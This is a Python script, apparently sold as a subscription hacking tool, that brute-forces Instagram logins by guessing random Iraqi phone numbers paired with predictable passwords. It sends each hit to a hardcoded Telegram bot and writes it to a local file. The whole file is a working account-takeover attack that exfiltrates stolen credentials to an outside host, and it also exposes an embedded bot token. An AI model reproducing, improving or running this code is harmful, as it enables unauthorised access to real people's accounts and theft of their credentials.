import requests, os, random, json, threading, secrets, uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
w = 'https://pastebin.com/raw/dkDmPWKf'
rss = requests.get(w).text
if '[1]' in rss:
    print(G + 'الاشتراك غير منهي')
    ID = '948449142'
    token = '1854678813:AAGIZoD8TIP5dNIUBsC4B8q7CJF4kHn3tdg'
    r = requests.Session()
    user = '1234567890'
    h = '+964077'
    ww = '077'
    while True:
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+964077' + us
        password = '077' + us
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
        data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
        req_login = r.post(url, headers=headers, data=data, proxies=None)
        if 'userId' in req_login.text:
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=BY → @BBZZD  ✓\n𝑬𝒎𝑨𝒊𝑳 : [ → {username} ← ]\npassword : [ → {password} ← ]\n- 𝐅𝐫𝐎𝐦 : @YYYY02 - @BBZZD "
            i = requests.post(tlg)
            print(G + 'username ==> : ' + username + ': password ==> : ' + password)
            with open('insta.txt', 'a') as (HACKED):
                HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
        else:
            print(E + 'username ==> : ' + username + ': password ==> : ' + password)

else:
    print('نهتت الفترة المجانية راسل المطور لتفعيل ')
    print('معرف المطورين')
    print('@BBZZD \n@BBDZZ')